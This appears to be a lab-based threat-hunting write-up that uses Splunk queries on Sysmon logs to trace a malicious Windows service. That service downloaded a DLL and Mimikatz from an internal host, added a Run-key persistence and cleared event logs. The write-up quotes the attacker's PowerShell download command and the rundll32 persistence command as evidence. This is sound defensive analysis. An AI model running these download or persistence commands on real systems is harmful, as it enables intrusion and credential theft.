---
title: Hunting Suspicious Command Execution Artifacts
date: 2026-11-09
category: Threat Hunting
summary: A threat-hunting investigation using Splunk to identify suspicious command execution, reconstruct process relationships, and uncover potentially malicious activities.
tags: [Threat Hunting, PowerShell, Suspicious Execution]
tools: [Splunk, SPL, Sysmon, PowerShell, MITRE ATT&CK, Virustotal]
attack: [T1059, T1059.001, CAR-2014-04-003]
source: Lab Scenario: SOC 201 Course From TCM Security.
---
## Scenario
The SOC team initiated a threat hunting investigation in Splunk after identifying **suspicious execution activity**. 
The investigation focused on tracing the source of the activity, analyzing related process execution, and identifying associated file and network activities.

## Key Findings
:::callout Key Findings
- **Host:** `WKS-4F1D.avongate.local` (`10.0.2.7`).
- **Malicious service:** `PtQC` runs `C:\Windows\THybZSNv.exe` as `NT AUTHORITY\SYSTEM`. VirusTotal flagged the executable as malicious.
- **Malicious activities:** `cmd.exe` (PID `3916`) performed system discovery, downloaded payloads, created Registry persistence, and cleared Windows event logs.
- **Credential access:** `mimi.exe` was identified as Mimikatz by VirusTotal. However, credential theft was not confirmed.
- **Further investigation:** The initial service installation, the identity of `10.0.2.6`, and the behavior of `dghelper.dll` need more investigating.
:::

## Environment & Tools
- Operating System: Windows 10/11 Enterprise.
- Telemetry Collection: Sysmon.
- SIEM Platform: Splunk Enterprise.
- Log Sources: Sysmon & Security Event Logs.

## Hunting Overview
:::callout Questions to answer
### What are we hunting for?
- Suspicious execution of `cmd.exe` and `powershell.exe`.
- Encoded or obfuscated PowerShell commands.
- Suspicious file downloads and payload execution.
- Unusual parent-child process relationships.
### Where can we find this data?
- **Windows Security Logs:** Event ID 4688 (Process Creation).
- **PowerShell Operational Logs:** Event IDs 4103 and 4104.
- **Sysmon Logs:** Event IDs 1, 3, 7, and 11.
- **EDR/XDR Telemetry:** Not included in this investigation.
### How can we analyze this data?
- Filter events by process names, command-line arguments, and suspicious keywords.
- Aggregate execution events by host, user, and process.
- Reconstruct process trees using parent and child process identifiers.
- Correlate process execution with network and authentication events.
- Identify abnormal execution patterns and suspicious behavior.
:::


##  Hunting & Analysis
**The hunt moves through six stages: an initial investigating, confirming and scoping it, a second payload, the root cause, the service behind it, and the full process tree.**

---

### Stage 1: Initial investigating, PowerShell downloading a DLL

First, we identify the available data sources within our Splunk indexes using the following SPL query:

```SPL
| metadata type=sources index=*
```

![Available data sources in Splunk](<assets/investigations/Hunting PowerShell Execution Artifacts/1.png>)

Since Sysmon telemetry is available in our environment, we will focus our investigation on Sysmon events.

We begin by examining _`powershell.exe`_ using Sysmon _`Event ID 1`_ (Process Creation), which records newly created processes and provides details about the image using the following query.

```SPL
index="aa15cbf9" 
    source="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational" 
    EventID=1 
    Image=*\\powershell.exe*
    | stats count by Image
```

![powershell.exe image paths](<assets/investigations/Hunting PowerShell Execution Artifacts/2.png>)

We identified two different paths for _`powershell.exe`_: one located in _`C:\Windows\System32`_, which is the native 64-bit version, and another in _`C:\Windows\SysWOW64`_, which is the 32-bit version.<br><br>
However, the presence of both executables is normal Windows behavior and does not indicate malicious activity by itself.

To get a clearer picture of PowerShell execution, we filter Sysmon _`Event ID 1`_ events and examine the timestamp, user, executable path, parent process, and command-line arguments.

```SPL
index="aa15cbf9" 
    source="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational" 
    EventID=1 
    Image=*\\powershell.exe*
    | table _time, user, Image, ParentImage, CommandLine, ParentCommandLine
    | sort - _time
```

![PowerShell process creation events](<assets/investigations/Hunting PowerShell Execution Artifacts/3.png>)

At first look, I noticed a process named _`CompatTelRunner.exe`_. Its _`ParentCommandLine`_ showed:

```bash
powershell.exe -ExecutionPolicy Restricted -Command
```
To better understand this process and determine whether its execution is legitimate or suspicious, 
I started researching it using **[EchoTrail](https://echotrail.io/)** to examine its typical behavior and execution context.

![EchoTrail](<assets/investigations/Hunting PowerShell Execution Artifacts/4.png>)
We can't classify _`CompatTelRunner.exe`_ as malicious yet. It is a legitimate Windows Compatibility Telemetry component. <br>

However, while reviewing the query results, I noticed something more suspicious.<br>

While reviewing the same results, something more suspicious appeared. The 32-bit instance running from _`C:\Windows\SysWOW64`_ had an unusual command line:
```bash
powershell.exe -c "Invoke-WebRequest -Uri http://10.0.2.6/dghelper.dll -OutFile 'C:\Windows\System32\dghelper.dll'"
```

This command downloads a DLL from an internal IP address and saves it to the Windows System32 directory.

This behavior requires further investigation, particularly to determine what the DLL is, why it was downloaded, and which process initiated the activity.

**What makes this suspicious?**
- `Invoke-WebRequest`: Used to download content from a remote server.
- `10.0.2.6`: The remote download source.
- `dghelper.dll`: The downloaded DLL.

---

### Stage 2: Confirming and scoping the download
Since PowerShell Operational logs are available, we examine _`Event ID 4103`_ (Module Logging),
which records PowerShell command invocations and their bound parameters.

```SPL
index="aa15cbf9" 
    source="XmlWinEventLog:Microsoft-Windows-PowerShell/Operational" 
    EventID=4103
    | where Not like(Payload, "%.inf%")
    | stats count by Payload
```
![PowerShell module logging payload](<assets/investigations/Hunting PowerShell Execution Artifacts/5.png>)

The event confirmed that _`Invoke-WebRequest`_ was invoked with a URL pointing to _`http://10[.]0[.]2[.]6/dghelper.dll`_ and an output path of _`C:\Windows\System32\dghelper.dll`_. <br>
This supports the previous finding and gives us pivot points, so we need some questions:


- Who is _`10.0.2.6`_?
- Who is _`10.0.2.6`_ communicating with?
- Did _`10.0.2.6`_ perform any other malicious activity?
- When was _`dghelper.dll`_  created and its hash value?
- What were the PID & PPID associated with this activity?
- What process or service initiated the download?

After further investigation, _`10.0.2.6`_ was identified as an internal IP address but its actual identity and role could not be confirmed from the available telemetry. <br>

I aslo checkeded the connections associated with the destination IP address _`10.0.2.6`_ to identify other systems communicating with it
```SPL
index="aa15cbf9" 
    EventID=3 
    "10.0.2.6" 
    | table _time Computer SourceIp SourcePort DestinationIp DestinationPort  Protocol 
    | sort _time
```
![Network connections to 10.0.2.6](<assets/investigations/Hunting PowerShell Execution Artifacts/7.png>)

There is no evidence of other victim machines communicating with _`10.0.2.6`_ in the available telemetry. The only observed communication was from _`10.0.2.7`_.

Next, we need to determine when _`dghelper.dll`_ was created, which computer it was created on, and under which user account.

```SPL
index="aa15cbf9" `
    EventID=11
    TargetFilename="*\\dghelper.dll"
    | table _time Computer User Image TargetFilename
    | sort _time
```

![dghelper.dll file creation event](<assets/investigations/Hunting PowerShell Execution Artifacts/6.png>)

At **2025-06-11 22:29:50** _`dghelper.dll`_ was created in  _`C:\Windows\SysWOW64\dghelper.dll`_ on _`WKS-4F1D.avongate.local`_.
under _`NT AUTHORITY\SYSTEM`_ account wtich indicates high privileges. 

---

### Stage 3: A second payload
I also investigated any other downloaded files from _`10.0.2.6`_.
```SPL
index="aa15cbf9" 
    source="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational" 
    EventID=1 "10.0.2.6"
    | table _time host user Image CommandLine MD5
    | sort - _time
```
![certutil downloading mimi.exe](<assets/investigations/Hunting PowerShell Execution Artifacts/8.png>)

It seems that the adversary used _`certutil.exe`_ to retrieve _`mimi.exe`_ from _`10.0.2.6`_ over HTTP and save it to _`C:\Windows\System32\mimi.exe`_. <br>
I also obtained the hash value of _`mimi.exe`_ to start the intelligence investigation. <br>

![mimi.exe hash value](<assets/investigations/Hunting PowerShell Execution Artifacts/9.png>)
Searching the MD5 _`29efd64dd3c7fe1e2b022b7ad73a1ba5`_ on **[Virustotal](https://www.virustotal.com/gui/home/upload)** returned a malicious verdict.

![VirusTotal result for mimi.exe](<assets/investigations/Hunting PowerShell Execution Artifacts/10.png>)

**[Virustotal](https://www.virustotal.com/gui/home/upload)** identified the file as _`mimikatz.exe`_, a tool commonly associated with credential dumping. 

---

### Stage 4: Root cause, tracing the parent chain
The PPID of the download events is _`3916`_, so we investigate which processes this PID launched.

```SPL
index="aa15cbf9"
    source="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational" 
    ParentProcessId=3916
    | table _time host user Image CommandLine
    | sort - _time
```
![Child processes of PID 3916](<assets/investigations/Hunting PowerShell Execution Artifacts/11.png>)

Now, things are getting interesting! A lot of suspicious activity is happening here. <br><br>

Multiple suspicious activities have been identified, including Discovery, Defense Evasion, Persistence, and Command and Control (C2). 
Each tactic will be investigated in depth in a dedicated case study post.

We identified PID 3916 (cmd.exe) as the parent of several suspicious activities. The next step is to identify which process spawned it.
```SPL
index="aa15cbf9" 
    source="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational" 
    ProcessId=3916
    | table _time, Image, ParentImage
    | sort - _time
```
![Parent process of PID 3916](<assets/investigations/Hunting PowerShell Execution Artifacts/12.png>)

PID _`3916`_ belongs to _`cmd.exe`_, and its `ParentImage` points to a suspicious executable named _`C:\Windows\THybZSNv.exe`_.

---

### Stage 5: The service behind the executable
Next we determine what _`THybZSNv.exe`_ is, whether it ran as a Windows service, and how it was launched.

```SPL
index="aa15cbf9" 
    source="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational" 
    EventID=1 
    Image="C:\\Windows\\THybZSNv.exe"
    | table _time, host, user, Image, ParentImage, CommandLine, ParentCommandLine
    | sort - _time
```

![THybZSNv.exe process creation](<assets/investigations/Hunting PowerShell Execution Artifacts/13.png>)

Now it's clear that _`THybZSNv.exe`_ is a suspicious executable running as a Windows service from _`C:\Windows\THybZSNv.exe`_, launched by _`services.exe`_. <br><br>
Its MD5 is _`6983f7001de10f4d19fc2d794c3eb534`_, and the analysis also flagged the file as malicious.

![VirusTotal result for THybZSNv.exe](<assets/investigations/Hunting PowerShell Execution Artifacts/15.png>)

To find the service name that runs this file, we examine Event ID _`7045`_, which is generated when a new service is installed.

```SPL
index="aa15cbf9" EventCode=7045
| table _time ServiceName ImagePath ProcessID
```

![Service installation event 7045](<assets/investigations/Hunting PowerShell Execution Artifacts/14.png>)

The service name is _`PtQC`_, with the executable path _`%SystemRoot%\THybZSNv.exe`_ and _`PID 728`_.

---

### Stage 6: Rebuilding the process tree
To get the complete picture, I used **[PStree](https://www.splunk.com/en_us/blog/security/process-hunting-with-a-process.html?locale=en_us)** to reconstruct the process execution tree around _`THybZSNv.exe`_.

```SPL
index="aa15cbf9" 
    source="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational" 
    EventID=1
    | rex field=ParentImage "\x5c(?<ParentName>[^\x5c]+)$"
    | rex field=Image "\x5c(?<ProcessName>[^\x5c]+)$"
    | eval parent = ParentName." (".ParentProcessId.")"
    | eval child = ProcessName." (".ProcessId.")"
    | eval detail=strftime(_time,"%Y-%m-%d %H:%M:%S")." ".CommandLine
    | pstree child=child parent=parent detail=detail spaces=50
    | search tree="*THybZSNv.exe"
    | table tree

```
![PStree output for THybZSNv.exe](<assets/investigations/Hunting PowerShell Execution Artifacts/16.png>)

This completes the first stage of the investigation: the process execution chain is established, the suspicious activities are identified, and the execution timeline is reconstructed.<br><br>
In the next stages, we will investigate the identified activities across the Discovery, Defense Evasion, and Persistence tactics. Command and Control (C2) will be covered in a separate case study.


## Reconstructed Process Execution Tree
```
services.exe (PID 728)
└── THybZSNv.exe (PID 10228)
    └── cmd.exe (PID 3916)
        ├── ipconfig.exe (PID 6080)
        ├── whoami.exe (PID 1760)
        ├── powershell.exe (PID 2748)
        ├── reg.exe (PID 2256)
        ├── wevtutil.exe (PID 3892)
        ├── wevtutil.exe (PID 6288)
        ├── wevtutil.exe (PID 8480)
        ├── certutil.exe (PID 3244)
        └── mimi.exe (PID 9296)
```

## Timeline
:::timeline
2025-06-11 22:28:11 | Service execution | `services.exe` starts the `PtQC` service, executing `THybZSNv.exe`. 
2025-06-11 22:28:14 | Command execution | `THybZSNv.exe` spawns `cmd.exe` (PID 3916).
2025-06-11 22:28:37 | User discovery | `whoami /all` executed to enumerate user and privilege information.
2025-06-11 22:28:44 | Network discovery | `ipconfig /all` executed to enumerate network configuration.
2025-06-11 22:29:46 | Payload download | PowerShell downloads `dghelper.dll` from `10.0.2.6`.
2025-06-11 22:29:50 | DLL creation | `dghelper.dll` created on disk. Recorded path is `C:\Windows\SysWOW64\`. 
2025-06-11 22:30:38 | Persistence established | Registry Run key modified with the `Updater`. 
2025-06-11 22:30:48 | Log clearing | Security event log cleared using `wevtutil.exe`. 
2025-06-11 22:30:54 | Log clearing | System event log cleared using `wevtutil.exe`.
2025-06-11 22:30:58 | Log clearing | Application event log cleared using `wevtutil.exe`. 
2025-06-11 22:31:19 | Payload download | `certutil.exe` downloads `mimi.exe` from `10.0.2.6`. 
2025-06-11 22:31:33 | Payload execution | `mimi.exe` (PID 9296) executed. 
:::

## MITRE ATT&CK Mapping
| Observed Activity | Tactic | Technique |
|---|---|---|
| `whoami /all` | Discovery | T1033 – System Owner/User Discovery |
| `ipconfig /all` | Discovery | T1016 – System Network Configuration Discovery |
| Downloading `dghelper.dll` | Command and Control | T1105 – Ingress Tool Transfer |
| Malicious Windows service installation | Persistence | T1543.003 – Windows Service |
| Registry Run key modification | Persistence | T1547.001 – Registry Run Keys / Startup Folder |
| Clearing Windows event logs | Defense Evasion | T1070.001 – Clear Windows Event Logs |
| Downloading `mimi.exe` | Command and Control | T1105 – Ingress Tool Transfer |

## Indicators of Compromise
| Type | Value | Notes |
|---|---|---|
| Host | `WKS-4F1D.avongate.local` | Compromised workstation |
| IP | `10.0.2.7` | Compromised workstation |
| IP | `10.0.2.6` | Payload source, identity unconfirmed |
| URL | `http://10.0.2.6/dghelper.dll` | DLL download over HTTP |
| URL | `http://10.0.2.6/mimi.exe` | Executable download over HTTP |
| File | `C:\Windows\THybZSNv.exe` | Service executable |
| MD5 | `6983f7001de10f4d19fc2d794c3eb534` | `THybZSNv.exe`, flagged malicious |
| File | `C:\Windows\System32\mimi.exe` | Identified as Mimikatz |
| MD5 | `29efd64dd3c7fe1e2b022b7ad73a1ba5` | `mimi.exe`, flagged malicious |
| File | `C:\Windows\SysWOW64\dghelper.dll` | Path recorded by Sysmon EID 11, hash not obtained |
| Service | `PtQC` | Image path `%SystemRoot%\THybZSNv.exe` |
| Registry | `HKLM\Software\Microsoft\Windows\CurrentVersion\Run`, value `Updater` | Runs `rundll32 C:\Windows\System32\dghelper.dll,MainFunc` |
| Account | `NT AUTHORITY\SYSTEM` | Execution account |
| Command | `whoami /all`, `ipconfig /all` | Discovery commands |

## Gaps & next steps
- **Initial access is unknown.** The telemetry reviewed starts at the service execution. How `THybZSNv.exe` first landed on the host and how the service was installed is not established.
- **`10.0.2.6` is unidentified.** Only `10.0.2.7` was seen communicating with it in the available telemetry.
- **`dghelper.dll` was not analyzed.** Its hash and behavior are still unknown, so its role beyond the persistence command is unconfirmed.
- **Credential theft is unverified.** `mimi.exe` executed, but no evidence was reviewed of what it accessed.
- **Further investigation is needed** to understand the identified Discovery, Persistence, Defense Evasion, and C2 activities.

## Response actions
1. Isolate the compromised workstation.
2. Preserve forensic evidence for further analysis.
3. Remove the malicious service and associated files.
4. Remove the malicious Registry Run key.
5. Reset potentially compromised credentials.
6. Search other endpoints for the identified IOCs.
7. Restore the system after completing remediation.

## Conclusion
- The reconstructed process tree revealed several suspicious activities originating from `THybZSNv.exe` (PID 10228), including system discovery, downloading additional payloads, modifying registry keys for persistence, and clearing Windows event logs.<br>
- These findings provide a starting point for investigating the observed behaviors across the Discovery, Defense Evasion, Persistence, and Command and Control (C2) tactics.<br>
- Each activity will be examined further to establish its execution context, identify supporting evidence, and determine its impact on the compromised endpoint.


